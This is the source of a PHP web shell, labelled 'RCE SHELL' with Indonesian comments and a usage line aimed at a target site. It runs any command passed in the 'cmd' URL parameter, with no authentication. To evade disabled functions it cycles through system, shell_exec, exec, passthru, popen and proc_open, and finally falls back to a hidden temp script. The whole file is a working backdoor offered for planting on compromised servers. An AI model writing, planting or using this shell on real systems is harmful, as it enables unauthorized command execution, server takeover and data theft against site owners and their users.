<?php
// ============================================================
// RCE SHELL — PHP
// Akses: https://target.com/rce.php?cmd=id
// ============================================================

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = '';

    // Coba semua method
    if (function_exists('system')) { ob_start(); system($cmd); $output = ob_get_clean(); }
    if (empty($output) && function_exists('shell_exec')) { $output = shell_exec($cmd . ' 2>&1'); }
    if (empty($output) && function_exists('exec')) { exec($cmd, $out); $output = implode("\n", $out); }
    if (empty($output) && function_exists('passthru')) { ob_start(); passthru($cmd); $output = ob_get_clean(); }
    if (empty($output) && function_exists('popen')) { $h = popen($cmd, 'r'); if ($h) { $output = stream_get_contents($h); pclose($h); } }
    if (empty($output) && function_exists('proc_open')) { $desc = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']]; $p = proc_open($cmd,$desc,$pipes); if (is_resource($p)) { fclose($pipes[0]); $output = stream_get_contents($pipes[1]); fclose($pipes[1]); fclose($pipes[2]); proc_close($p); } }
    if (empty($output)) { $tmp = sys_get_temp_dir() . '/.sh_' . rand(); file_put_contents($tmp, "#!/bin/bash\n$cmd\n"); chmod($tmp, 0755); include($tmp); unlink($tmp); }

    die("<pre>" . ($output ?: "❌ Gagal!") . "</pre>");
}
?>